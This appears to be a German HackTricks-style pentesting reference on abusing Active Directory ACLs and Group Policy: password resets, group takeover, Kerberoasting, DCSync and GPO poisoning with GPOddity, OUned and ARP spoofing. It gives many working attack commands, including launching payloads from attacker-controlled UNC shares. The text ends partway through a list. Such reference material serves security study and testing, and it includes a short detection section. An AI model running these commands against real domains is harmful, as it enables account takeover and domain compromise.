# Missbrauch von Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**Diese Seite ist größtenteils eine Zusammenfassung der Techniken aus** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **und** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Weitere Details finden Sie in den Originalartikeln.**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll-Berechtigungen für einen Benutzer**

Dieses Privileg gibt einem Angreifer die vollständige Kontrolle über ein Zielbenutzerkonto. Sobald die `GenericAll`-Berechtigungen mit dem Befehl `Get-ObjectAcl` bestätigt wurden, kann ein Angreifer:

- **Das Passwort des Ziels ändern**: Mit `net user <username> <password> /domain` kann der Angreifer das Passwort des Benutzers zurücksetzen.
- Unter Linux können Sie dasselbe über SAMR mit Samba `net rpc` tun:<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

- **Wenn das Konto deaktiviert ist, das UAC-Flag löschen**: `GenericAll` erlaubt die Bearbeitung von `userAccountControl`. Unter Linux kann BloodyAD das Flag `ACCOUNTDISABLE` entfernen:<sup>[[8]](#references)[[10]](#references)</sup>

```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```

- **Targeted Kerberoasting**: Weise dem Benutzerkonto einen SPN zu, damit es kerberoastbar wird. Verwende anschließend Rubeus und targetedKerberoast.py, um die Ticket-Granting-Ticket-(TGT-)Hashes zu extrahieren und zu versuchen, sie zu knacken.

```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```

- **Targeted ASREPRoasting**: Pre-Authentication für den Benutzer deaktivieren, wodurch dessen Konto für ASREPRoasting anfällig wird.

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- **Shadow Credentials / Key Credential Link**: Mit `GenericAll` für einen Benutzer kannst du eine zertifikatsbasierte Anmeldeinformation hinzufügen und dich als dieser Benutzer authentifizieren, ohne sein Passwort zu ändern. Siehe:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **GenericAll-Rechte für eine Gruppe**

Dieses Privileg ermöglicht es einem Angreifer, Gruppenmitgliedschaften zu manipulieren, wenn er `GenericAll`-Rechte für eine Gruppe wie `Domain Admins` besitzt. Nachdem der Distinguished Name der Gruppe mit `Get-NetGroup` ermittelt wurde, kann der Angreifer:

- **Sich selbst zur Gruppe Domain Admins hinzufügen**: Dies ist mit direkten Befehlen oder mithilfe von Modulen wie Active Directory oder PowerSploit möglich.

```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```

- Von Linux aus kannst du außerdem BloodyAD nutzen, um dich beliebigen Gruppen hinzuzufügen, wenn du GenericAll/Write-Mitgliedschaftsrechte für sie hast. Ist die Zielgruppe in „Remote Management Users“ verschachtelt, erhältst du sofort WinRM-Zugriff auf Hosts, die diese Gruppe berücksichtigen:<sup>[[8]](#references)</sup>

```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```

## **GenericAll / GenericWrite / Write on Computer/User**

Diese Berechtigungen für ein Computerobjekt oder Benutzerkonto ermöglichen Folgendes:

- **Kerberos Resource-based Constrained Delegation**: Ermöglicht die Übernahme eines Computerobjekts.
- **Shadow Credentials**: Mit dieser Technik kann ein Computer- oder Benutzerkonto imitiert werden, indem die Berechtigungen zum Erstellen von Shadow Credentials ausgenutzt werden.

## **WriteProperty on Group**

Wenn ein Benutzer für alle Objekte einer bestimmten Gruppe (z. B. `Domain Admins`) `WriteProperty`-Berechtigungen hat, kann er:

- **Sich selbst zur Gruppe Domain Admins hinzufügen**: Dies ist durch die Kombination der Befehle `net user` und `Add-NetGroupUser` möglich und erlaubt eine Rechteausweitung innerhalb der Domäne.

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **Self (Self-Membership) für Gruppen**

Dieses Privileg ermöglicht es Angreifern, sich selbst bestimmten Gruppen wie `Domain Admins` hinzuzufügen, indem sie Befehle verwenden, die die Gruppenmitgliedschaft direkt ändern. Mit der folgenden Befehlssequenz können sie sich selbst hinzufügen:

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **WriteProperty (Self-Membership)**

Ein ähnliches Privileg ermöglicht es Angreifern, sich direkt zu Gruppen hinzuzufügen, indem sie Gruppeneigenschaften ändern, sofern sie für diese Gruppen über das Recht `WriteProperty` verfügen. Die Überprüfung und Ausnutzung dieses Privilegs erfolgt mit:

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```

## **ForceChangePassword**

Das `ExtendedRight` für `User-Force-Change-Password` auf einem Benutzer ermöglicht das Zurücksetzen des Passworts, ohne das aktuelle Passwort zu kennen. Dieses Recht lässt sich mit PowerShell oder alternativen Kommandozeilentools überprüfen und ausnutzen. Es gibt verschiedene Möglichkeiten, das Passwort eines Benutzers zurückzusetzen, darunter interaktive Sitzungen und One-Liner für nicht interaktive Umgebungen. Die Befehle reichen von einfachen PowerShell-Aufrufen bis zur Verwendung von `rpcclient` unter Linux und zeigen die Vielseitigkeit der Angriffsvektoren.

```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```

## **WriteOwner für eine Gruppe**

Wenn ein Angreifer feststellt, dass er über `WriteOwner`-Rechte für eine Gruppe verfügt, kann er die Gruppe als Eigentümer sich selbst zuweisen. Besonders folgenreich ist dies bei der Gruppe `Domain Admins`, da ein Wechsel des Eigentümers eine umfassendere Kontrolle über Gruppenattribute und Mitgliedschaften ermöglicht. Dazu wird das richtige Objekt mit `Get-ObjectAcl` identifiziert und anschließend der Eigentümer mit `Set-DomainObjectOwner` geändert, entweder anhand der SID oder des Namens.

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```

## **GenericWrite auf einen Benutzer**

Diese Berechtigung ermöglicht es einem Angreifer, Benutzereigenschaften zu ändern. Mit `GenericWrite`-Zugriff kann der Angreifer insbesondere den Pfad des Anmeldeskripts eines Benutzers ändern, damit bei dessen Anmeldung ein schädliches Skript ausgeführt wird. Dazu wird der Befehl `Set-ADObject` verwendet, um die Eigenschaft `scriptpath` des Zielbenutzers so zu ändern, dass sie auf das Skript des Angreifers verweist.

```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```

Ein enger gefasstes `WriteProperty`-ACE, das auf das [`scriptPath`-Attribut](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada3/c640630e-23ff-44e7-886f-16df9574039e) des Benutzers beschränkt ist, kann ausreichen; `GenericWrite` ist nicht erforderlich. Kombinieren Sie dieses Attributrecht mit einem beschreibbaren Skript im `SYSVOL\<domain>\scripts`- oder `NETLOGON`-Verzeichnis des Domäne und prüfen Sie anschließend, ob sich der Zielbenutzer wahrscheinlich anmeldet und das Skript erreicht. Das Skript wird bei der Anmeldung im Kontext dieses Benutzers ausgeführt. Prüfen Sie die effektiven AD- und Datei-/Freigabe-ACLs getrennt; ein passendes Allow ACE oder ein beschreibbares Verzeichnis allein belegt nicht, dass der gesamte Pfad gegeben ist.

## **GenericWrite on Group**

Mit diesem Privileg können Angreifer die Gruppenmitgliedschaft manipulieren, etwa indem sie sich selbst oder andere Benutzer bestimmten Gruppen hinzufügen. Dabei wird ein Credential-Objekt erstellt und verwendet, um Benutzer zu einer Gruppe hinzuzufügen oder daraus zu entfernen. Anschließend werden die Änderungen an der Mitgliedschaft mit PowerShell-Befehlen überprüft.

```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```

- Von Linux aus kann Samba `net` Mitglieder hinzufügen oder entfernen, wenn du `GenericWrite` für die Gruppe besitzt (nützlich, wenn PowerShell/RSAT nicht verfügbar sind):<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

## **WriteDACL + WriteOwner**

Der Besitz eines AD-Objekts und die `WriteDACL`-Berechtigungen dafür ermöglichen es einem Angreifer, sich selbst `GenericAll`-Berechtigungen für das Objekt zu gewähren. Dies wird durch ADSI-Manipulation erreicht und ermöglicht die vollständige Kontrolle über das Objekt sowie die Änderung seiner Gruppenmitgliedschaften. Allerdings gibt es Einschränkungen beim Versuch, diese Berechtigungen mit den Cmdlets `Set-Acl` / `Get-Acl` des Active Directory-Moduls auszunutzen.<sup>[[4]](#references)[[7]](#references)</sup>

```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```

### Schnelle Übernahme mit WriteDACL/WriteOwner (PowerView)

Wenn du `WriteOwner` und `WriteDacl` für ein Benutzer- oder Dienstkonto hast, kannst du die vollständige Kontrolle übernehmen und das Passwort mit PowerView zurücksetzen, ohne das alte Passwort zu kennen:

```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```

Hinweise:
- Möglicherweise musst du zuerst den Besitzer ändern, sodass du selbst der Besitzer bist, wenn du nur `WriteOwner` hast:

```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```

- Überprüfen Sie den Zugriff nach dem Zurücksetzen des Passworts mit einem beliebigen Protokoll (SMB/LDAP/RDP/WinRM).

## **Replikation in der Domäne (DCSync)**

Der DCSync-Angriff nutzt bestimmte Replikationsberechtigungen in der Domäne, um einen Domain Controller nachzuahmen und Daten, einschließlich Benutzeranmeldedaten, zu synchronisieren. Diese leistungsstarke Technik erfordert Berechtigungen wie `DS-Replication-Get-Changes`, mit denen Angreifer sensible Informationen aus der AD-Umgebung extrahieren können, ohne direkten Zugriff auf einen Domain Controller zu haben.<sup>[[5]](#references)</sup> [**Erfahren Sie hier mehr über den DCSync-Angriff.**](../dcsync.md)

## GPO-Delegierung <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO-Delegierung

Delegierter Zugriff zur Verwaltung von Group Policy Objects (GPOs) kann erhebliche Sicherheitsrisiken bergen. Wenn beispielsweise einem Benutzer wie `offense\spotless` Rechte zur GPO-Verwaltung delegiert wurden, verfügt dieser möglicherweise über Berechtigungen wie **WriteProperty**, **WriteDacl** und **WriteOwner**. Diese Berechtigungen können für böswillige Zwecke missbraucht werden, wie mithilfe von PowerView ermittelt wurde: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### GPO-Berechtigungen auflisten

Um falsch konfigurierte GPOs zu identifizieren, können die Cmdlets von PowerSploit miteinander verkettet werden. So lassen sich GPOs finden, die ein bestimmter Benutzer verwalten darf: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Computer, auf die eine bestimmte Richtlinie angewendet wird**: Es ist möglich, herauszufinden, auf welche Computer eine bestimmte GPO angewendet wird. So lässt sich der Umfang möglicher Auswirkungen besser einschätzen. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Auf einen bestimmten Computer angewendete Richtlinien**: Mit Befehlen wie `Get-DomainGPO` lässt sich ermitteln, welche Richtlinien auf einen bestimmten Computer angewendet werden.

**OUs, auf die eine bestimmte Richtlinie angewendet wird**: Mit `Get-DomainOU` lassen sich die von einer bestimmten Richtlinie betroffenen Organisationseinheiten (OUs) identifizieren.

Sie können auch das Tool [**GPOHound**](https://github.com/cogiceo/GPOHound) verwenden, um GPOs aufzulisten und darin Probleme zu finden.

### GPO missbrauchen – New-GPOImmediateTask

Falsch konfigurierte GPOs können ausgenutzt werden, um Code auszuführen, beispielsweise durch das Erstellen einer sofortigen geplanten Aufgabe. Damit kann ein Benutzer der lokalen Administratorengruppe auf betroffenen Computern hinzugefügt werden, wodurch die Berechtigungen erheblich erweitert werden:

```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```

### GroupPolicy module - Missbrauch von GPOs

Das GroupPolicy-Modul ermöglicht, sofern es installiert ist, neue GPOs zu erstellen und zu verknüpfen sowie Einstellungen wie Registrierungswerte festzulegen, um Backdoors auf betroffenen Computern auszuführen. Bei dieser Methode muss die GPO aktualisiert werden und sich ein Benutzer am Computer anmelden, damit sie ausgeführt wird:

```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```

### SharpGPOAbuse – Missbrauch von GPOs

SharpGPOAbuse bietet eine Möglichkeit, vorhandene GPOs auszunutzen, indem Aufgaben hinzugefügt oder Einstellungen geändert werden, ohne neue GPOs erstellen zu müssen. Für dieses Tool müssen vorhandene GPOs geändert oder mithilfe von RSAT-Tools neue erstellt werden, bevor Änderungen angewendet werden:

```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```

### Erzwingen einer Richtlinienaktualisierung

GPO-Aktualisierungen erfolgen typischerweise etwa alle 90 Minuten. Um diesen Prozess zu beschleunigen, insbesondere nach einer Änderung, kann auf dem Zielcomputer der Befehl `gpupdate /force` verwendet werden, um sofort eine Richtlinienaktualisierung zu erzwingen. Dadurch wird sichergestellt, dass Änderungen an GPOs angewendet werden, ohne auf den nächsten automatischen Aktualisierungszyklus warten zu müssen.

### Unter der Haube

Bei der Untersuchung der geplanten Aufgaben einer bestimmten GPO, etwa der `Misconfigured Policy`, lässt sich das Hinzufügen von Aufgaben wie `evilTask` bestätigen. Diese Aufgaben werden durch Skripte oder Befehlszeilentools erstellt, die das Systemverhalten ändern oder Berechtigungen erweitern sollen.

Die Struktur der Aufgabe, wie sie in der von `New-GPOImmediateTask` erzeugten XML-Konfigurationsdatei dargestellt wird, beschreibt die Einzelheiten der geplanten Aufgabe – einschließlich des auszuführenden Befehls und seiner Trigger. Diese Datei zeigt, wie geplante Aufgaben innerhalb von GPOs definiert und verwaltet werden, und bietet eine Möglichkeit, beliebige Befehle oder Skripte im Rahmen der Richtlinienumsetzung auszuführen.

### Benutzer und Gruppen

GPOs ermöglichen auch die Manipulation von Benutzer- und Gruppenmitgliedschaften auf Zielsystemen. Durch direktes Bearbeiten der Richtliniendateien für Benutzer und Gruppen können Angreifer Benutzer zu privilegierten Gruppen hinzufügen, etwa zur lokalen Gruppe `administrators`. Dies ist durch die Delegierung von Berechtigungen zur GPO-Verwaltung möglich, die das Ändern von Richtliniendateien erlaubt, um neue Benutzer hinzuzufügen oder Gruppenmitgliedschaften zu ändern.

Die XML-Konfigurationsdatei für Benutzer und Gruppen beschreibt, wie diese Änderungen umgesetzt werden. Durch das Hinzufügen von Einträgen zu dieser Datei können bestimmten Benutzern auf betroffenen Systemen erweiterte Berechtigungen erteilt werden. Diese Methode bietet einen direkten Weg zur Rechteausweitung durch die Manipulation von GPOs.

Untersuchen Sie bei Sicherheitseinstellungen wie lokalen Gruppenmitgliedschaften und Benutzerrechten auch die angewendete GPO-Vorlage unter `Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf` sowie die ACL des Verzeichnisses `SecEdit`. Ein beschreibbares Verzeichnis oder eine beschreibbare Datei ist ein Hinweis, der überprüft werden sollte: Ob eine Änderung wirksam werden kann, hängt weiterhin von den effektiven Zugriffsrechten auf die SYSVOL-Freigabe, verweigernden und geerbten ACLs, den Berechtigungen des Group Policy Containers, dem Richtlinienbereich und der Clientaktualisierung ab. Die Mitgliedschaft in einer Gruppe namens „GPO Managers“ allein begründet keine Bearbeitungsrechte. [Microsoft dokumentiert diesen Vorlagenpfad sowie die Trennung zwischen Group Policy Container und Vorlage.](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/a600273b-75fc-4ce7-a1a3-ae221e102e91)

Darüber hinaus kommen weitere Methoden zur Codeausführung oder zum Aufrechterhalten von Persistenz infrage, etwa die Nutzung von An- und Abmeldeskripten, das Ändern von Registrierungsschlüsseln für Autoruns, die Installation von Software über .msi-Dateien oder das Bearbeiten von Dienstkonfigurationen. Diese Techniken bieten verschiedene Möglichkeiten, durch den Missbrauch von GPOs Zugriff aufrechtzuerhalten und Zielsysteme zu kontrollieren.

### GPC/GPT-Abruf zu authentifizierten Rogue-Diensten umleiten

Eine GPO besteht aus einem LDAP-**Group Policy Container (GPC)** mit Metadaten und einem über SMB gehosteten **Group Policy Template (GPT)** mit den Richtliniendateien. Während der Aktualisierung folgt der Client dem `gPLink` des Containers, liest den referenzierten GPC und dessen `gPCFileSysPath` und lädt anschließend das GPT von diesem UNC-Pfad herunter. Daher kann Schreibzugriff auf den GPC selbst oder auf den `gPLink` einer OU, Site oder Domäne für privilegierte Richtlinienverarbeitung ausgenutzt werden.<sup>[[12]](#references)[[13]](#references)[[14]](#references)[[15]](#references)</sup>

#### `gPCFileSysPath`-Poisoning mit GPOddity

Wenn der kontrollierte Principal den Ziel-GPC bearbeiten kann (direkt oder über **NTLM relay to LDAP**), kann er `gPCFileSysPath` durch einen vom Angreifer gehosteten UNC-Pfad ersetzen. [GPOddity](https://github.com/synacktiv/GPOddity) automatisiert die LDAP-Änderung und stellt ein bösartiges GPT mit modulbasierten Richtliniendateien oder einer Immediate Task bereit, die der Group Policy-Client als `NT AUTHORITY\SYSTEM` ausführt.<sup>[[12]](#references)[[15]](#references)[[16]](#references)</sup>

Eine anonyme oder nicht an Anmeldedaten gebundene SMB-Freigabe reicht auf aktuellen Windows-Clients nicht aus: SMB Secure Negotiate verlangt einen Nachweis, dass die Authentifizierung erfolgreich war. Daher muss der Rogue-Dienst die Domänenidentität überprüfen, den SMB-Sitzungsschlüssel ableiten und seine Antworten korrekt signieren. Im eingebetteten Modus konfigurieren Sie GPOddity mit einem kontrollierten Computerkonto und dessen Serviceschlüssel und wählen dann im Abschnitt `[COMMANDS]` eine computer- oder benutzerseitige Payload aus.<sup>[[15]](#references)[[16]](#references)</sup>

```ini
[SMB]
smb-mode=embedded
smb-machine=SCAPY$
smb-ip=<attacker_ip>
smb-nt=<machine_nt_hash>
smb-share=gpoddity
smb-iface=eth0
```

```bash
python3 gpoddity.py --config config.ini -v
```

**User-GPO-Sonderfall:** Nach MS16-072 erstellt Windows weiterhin zwei SMB2-Sitzungen innerhalb derselben TCP-Verbindung: Die Benutzersitzung liest `GPT.INI`, danach liest die Sitzung des Computerkontos die effektive Konfiguration, etwa `ScheduledTasks.xml`. Ein rogue Server muss daher Authentifizierungsstatus, Sitzungsschlüssel und Signaturschlüssel anhand der SMB2-`SessionId` indizieren, nicht nur anhand des Sockets. Der in GPOddity/OUned eingebettete Scapy-Fork implementiert dies über `SMBStreamSocketMultiplexing` und einen multiplexingfähigen `SMBServer`; Single-Session-Server auf Basis von Impacket/Scapy verwenden andernfalls den falschen Signaturstatus erneut und scheitern bei Benutzerrichtlinien.<sup>[[15]](#references)</sup>

#### `gPLink` poisoning mit OUned

Mit `WriteGPLink`, `GenericWrite` oder gleichwertiger Kontrolle über eine OU, Site oder Domain kann ein Angreifer einen Link hinzufügen, dessen GPC-DN von einem LDAP-Host unter Angreiferkontrolle bereitgestellt wird. Dieses Primitive wurde ursprünglich von Petros Koutroumpis vorgestellt; [OUned](https://github.com/synacktiv/OUned) automatisiert den LDAP-Schreibzugriff und die bösartige GPC/GPT-Kette.<sup>[[13]](#references)[[14]](#references)[[17]](#references)</sup>

```text
[LDAP://cn={7B7D6B23-26F8-4E4B-AF23-F9B9005167F6},cn=policies,cn=system,DC=attacker,DC=corp,DC=com;0]
```

Das Opfer authentifiziert sich zunächst beim Rogue-LDAP-Dienst und erhält eine GPC, deren `gPCFileSysPath` auf den Rogue-SMB-Dienst verweist. Anschließend authentifiziert es sich bei SMB und wendet das bereitgestellte GPT an. OUned benötigt daher ein Konto mit einem LDAP-SPN, ein Computerkonto mit einem HOST-SPN für SMB (dasselbe Computerkonto kann beide Anforderungen erfüllen) sowie eine DNS-Auflösung oder Reverse-Forwarding, die die Ports 389 und 445 an den Host des Operators weiterleitet.<sup>[[15]](#references)[[17]](#references)</sup>

```bash
python3 OUned.py --config config.ini -v
```

OUneds eingebetteter Scapy-LDAP-Server validiert Kerberos/SPNEGO mit dem echten kontrollierten Dienstschlüssel und stellt beliebige GPC-Daten aus JSON bereit. Der leere JSON-Schlüssel bildet rootDSE ab, `base64:`-Präfixe kennzeichnen Binärwerte, und der Server unterstützt Add-, Delete-, Modify- und Search-Operationen sowie `BASE`-, `LEVEL`- und `SUBTREE`-Suchen; er kann ohne Schutz sowie mit Integritätsschutz oder Vertraulichkeitsschutz aushandeln. Dadurch lässt sich der Dienst wiederverwenden, wenn eine andere Windows-Komponente einem vom Angreifer kontrollierten LDAP-Verweis folgt, aber authentifiziertes LDAP voraussetzt.<sup>[[15]](#references)</sup>

Gehe nicht davon aus, dass das Synchronisieren eines Kontopassworts in eine Dummy-Domain alle Kerberos-Schlüssel reproduziert: RC4 wird aus dem Passwort abgeleitet, während AES-String-to-Key auch einen Salt verwendet, der sich aus Hostname und Domain des Principals ableitet. Wenn du den tatsächlichen AES-Schlüssel des Kontos an `KerberosSSP` übergibst, musst du RC4 nicht durch eine erkennbare Änderung an `msDS-SupportedEncryptionTypes` des Maschinenkontos erzwingen, das dieses Attribut selbst schreiben kann.<sup>[[15]](#references)</sup>

#### Erkennungsansätze

Korreliere Änderungen an `gPCFileSysPath` oder `gPLink` mit GPO-Versionsänderungen und neuen Immediate-/Scheduled-Task-XML-Dateien. Untersuche Verknüpfungen zu unerwarteten Naming Contexts, UNC-Hosts außerhalb des genehmigten DC-/SYSVOL-Bereichs, DNS-Einträge, die Namen von Maschinenkonten umleiten, LDAP-/CIFS-Service-Tickets für ungewöhnliche Maschinenkonten sowie Änderungen an `msDS-SupportedEncryptionTypes`, die RC4 aktivieren.<sup>[[15]](#references)</sup>

### WriteGPLink + UNC-Pfad-Hijacking (ARP-Spoofing)

Mit `WriteGPLink` für eine OU oder Domain kannst du das `gPLink`-Attribut des Zielcontainers ändern und **erzwingen, dass eine vorhandene GPO angewendet wird**, ohne die GPO selbst zu bearbeiten. Interessant wird das, wenn die verknüpfte GPO bereits auf entfernte Inhalte über **UNC-Pfade** (`\\HOST\share\...`) verweist, da authentifizierte Benutzer **SYSVOL** lesen und offline nach wiederverwendbaren Richtlinien suchen können.<sup>[[11]](#references)</sup>

Arbeitsablauf auf hoher Ebene:

1. Verwende BloodHound, um einen Principal mit `WriteGPLink` für eine OU zu identifizieren, und ermittle die Computer und Benutzer innerhalb dieser OU.
2. Klone `SYSVOL` schreibgeschützt und analysiere GPOs nach **Softwareinstallation**, **Laufwerkszuordnungen** (`Drives.xml`) und **Anmelde-/Startskripten**, die auf UNC-Pfade verweisen.
3. Bevorzuge Richtlinien, die auf einen **direkten Hostnamen** verweisen (zum Beispiel `\\DC02\share\pkg.msi`), statt auf DFS-/Domain-Namespace-Pfade, da sich hostnamebasierte Pfade einfacher per L2-Spoofing umleiten lassen.
4. Füge die GUID der ausgewählten GPO an `gPLink` der Ziel-OU an, damit das Opfer diese bereits vorhandene Richtlinie verarbeitet.
5. Spoofe im selben Broadcast-Domain den UNC-Host per ARP und binde seine IP lokal (`ip addr add <target_ip>/32 dev <iface>`), damit der SMB-Datenverkehr des Opfers deinen Host erreicht.
6. Stelle den erwarteten Pfad und Dateinamen über einen SMB-Server des Angreifers bereit (zum Beispiel `smbserver.py`) und warte auf die reguläre Richtlinienverarbeitung.

Beispiel für die Sammlung von `SYSVOL` und die Korrelation von GPOs:

```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```

Verknüpfe die vorhandene GPO mit der Ziel-OU:

```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
  --gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```

#### Software Installation UNC hijack -> SYSTEM

Wenn die verknüpfte GPO ein MSI von einem UNC-Pfad bereitstellt, ruft der Client es beim **Computerstart** ab und installiert es als **`NT AUTHORITY\SYSTEM`**. Indem du den referenzierten Host spoofst und unter **demselben Share/Pfad/Namen** ein schädliches MSI bereitstellst, kannst du `WriteGPLink` in SYSTEM-Codeausführung umwandeln, **ohne SYSVOL zu verändern**.

Wichtige Einschränkungen:

- **Das Timing ist entscheidend**: Der neue Link wird bei der Richtlinienaktualisierung erkannt (üblicherweise nach etwa 90 Minuten), **Software Installation** wird jedoch normalerweise erst beim **Neustart** ausgelöst.
- Windows Installer erfasst die Bereitstellung üblicherweise anhand des **`ProductCode`** des Pakets. Wenn das Produkt bereits installiert ist, wird die Bereitstellung möglicherweise übersprungen.
- Um eine Zurückweisung durch den Installer zu vermeiden, passe das manipulierte MSI so an, dass sein **`ProductCode`** und **`PackageCode`** mit denen des legitimen, von der GPO erwarteten Pakets übereinstimmen.
- Alte `.aas`-Ankündigungsdateien können in `SYSVOL` verbleiben. Prüfe daher, ob die Bereitstellung noch aktiv aussieht, bevor du dich darauf verlässt.

```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```

#### UNC-Hijack von Laufwerkszuordnungen -> NTLM-Capture / WebDAV-Relay

GPP-Laufwerkszuordnungen in `Drives.xml` führen dazu, dass sich Benutzer während der Anmeldung oder beim erneuten Verbinden beim konfigurierten UNC-Pfad authentifizieren. Wenn du den referenzierten Host spoofst, kannst du **NetNTLMv2** abfangen. Wenn SMB absichtlich fehlschlägt, versucht Windows es möglicherweise erneut über **WebDAV** und sendet **NTLM über HTTP**. Das ist für Relays zu **LDAP(S)**, **AD CS** oder **SMB** deutlich flexibler.

#### UNC-Hijack von Anmelde-/Startskripten

Dasselbe Muster gilt für UNC-gehostete Skripte, die in `SYSVOL` gefunden werden:

- **Anmeldeskripte** werden normalerweise im Kontext des **Benutzers** ausgeführt.
